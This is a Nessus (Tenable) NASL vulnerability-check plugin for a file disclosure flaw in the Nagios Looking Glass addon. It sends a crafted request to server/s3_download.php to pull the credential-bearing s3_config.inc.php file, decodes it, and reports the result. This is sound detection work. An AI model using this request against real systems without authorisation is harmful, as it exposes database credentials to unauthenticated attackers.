#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(71159);
  script_version("1.10");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(63381);

  script_name(english:"Nagios Looking Glass Addon for Nagios server/s3_download.php File Disclosure");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a file
disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Nagios Looking Glass Addon for Nagios installed on the remote host
is affected by a file disclosure vulnerability.  By sending a specially
crafted request to the Addon's 'server/s3_download.php' script, a
remote, unauthenticated attacker can leverage this vulnerability to
obtain the contents of files in the 'sync-files' directory by specifying
the filename in the 'filename' parameter and setting 'action' to
'update'.  This could lead to the exposure of database credentials, as
in the case of the file 's3_config.inc.php'.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2013/Oct/140");
  script_set_attribute(attribute:"solution", value:
"There is no solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"information disclosure");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/10/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/12/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:nagios:nagios_looking_glass");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
file = "s3_config.inc.php";
unaffected = '';
vuln = 0;

if (thorough_tests) dirs = list_uniq(make_list("/nlg", "/nagios", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  install_url = build_url(port:port, qs:dir);

  # Verify Addon is installed
  url = "/server/s3_download.php";
  res = http_send_recv3(
      method    : "GET",
      item      : dir + url,
      port         : port,
      exit_on_fail : FALSE
  );

  if ("***No filename given***" >< res[2])
  {
    url = url + "?filename=" + file + "&action=update";

    res = http_send_recv3(
      method    : "GET",
      item      : dir + url,
      port         : port,
      exit_on_fail : FALSE,
      follow_redirect: 1
    );
    body = res[2];

    # Check for errors
    error_returned = FALSE;
    if (!isnull(body) && ("Could not read file" >< body)) error_returned = TRUE;

    # Body is Base64 encoded, we need to decode
    body = base64_decode(str:body);
    pat = "configuration file for Network Looking Glass";

    if ((pat >< body || error_returned))
    {
      report = NULL;
      attach_file = NULL;
      output = NULL;
      req = install_url + url;
      request = NULL;

      if (report_verbosity > 0)
      {
        snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
        if (error_returned)
        {
          report =
            '\n' + 'Nessus was not able to exploit the issue, but was able to verify it'+
            '\n' + 'exists by examining the error message returned from the following' +
            '\n' + 'request :' +
            '\n' +
            '\n' + req +
            '\n';
        }
        else
        {
          report =
            '\n' + 'Nessus was able to exploit the issue to retrieve the contents of '+
            '\n' + 'the Nagios Looking Glass configuration file (\'' + file + '\')' +
            '\n' + 'using the following request :' +
            '\n' +
            '\n' + req +
            '\n' +
            '\n' + 'Note that this URL results in the Base64-encoded contents of the' +
            '\n' + 'configuration file.' +
            '\n';
        }
        if (report_verbosity > 1 && !error_returned)
        {
          attach_file = file;
          output = body;
          request = make_list(req);
        }
      }

      security_report_v4(port:port,
                         extra:report,
                         severity:SECURITY_WARNING,
                         request:request,
                         file:attach_file,
                         output:output);

      vuln++;
    }
    else
      unaffected += '\n\t' + install_url;
  }
}

if (vuln) exit(0);
if (unaffected) exit(0, 'The following install(s) of Nagios Looking Glass were found but are not affected :' + unaffected);
else audit(AUDIT_WEB_APP_NOT_INST, "Nagios Looking Glass", port);
